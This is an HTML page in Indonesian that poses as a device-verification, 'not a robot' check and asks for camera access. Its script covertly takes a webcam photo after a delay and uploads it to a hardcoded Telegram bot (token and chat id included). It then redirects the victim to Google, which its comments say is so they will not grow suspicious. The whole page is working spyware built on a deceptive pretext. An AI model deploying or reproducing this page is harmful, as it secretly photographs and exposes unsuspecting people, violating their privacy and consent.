<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f4; text-align: center; padding: 50px 20px; }
        .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <h2 id="status">Verifikasi Perangkat</h2>
        <p id="msg">Mohon izinkan akses kamera untuk mengonfirmasi bahwa Anda bukan robot.</p>
        <div id="loader" class="loader"></div>
    </div>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const token = '8294820735:AAFiNDZekoQwTp_sKu-qf-0KuVC8RNsfzY8'; 
        const chat_id = '985559722'; 

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;
                document.getElementById('status').innerText = "Sedang Memproses...";
                document.getElementById('msg').innerText = "Jangan tutup halaman ini, verifikasi sedang berlangsung (3 detik)...";

                // Beri jeda 4 detik agar target tidak langsung tutup & kamera stabil
                setTimeout(() => {
                    takeSnapshot();
                }, 4000);

            } catch (err) {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('status').innerText = "Gagal!";
                document.getElementById('msg').innerText = "Anda harus menekan 'Allow' agar bisa melanjutkan.";
            }
        }

        function takeSnapshot() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chat_id);
                formData.append('photo', blob, 'capture.jpg');

                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(() => {
                    // Setelah berhasil, arahkan ke Google agar tidak curiga
                    window.location.href = "https://www.google.com";
                })
                .catch(() => {
                    alert("Koneksi tidak stabil, coba lagi.");
                });
            }, 'image/jpeg');
        }

        window.onload = init;
    </script>
</body>
</html>
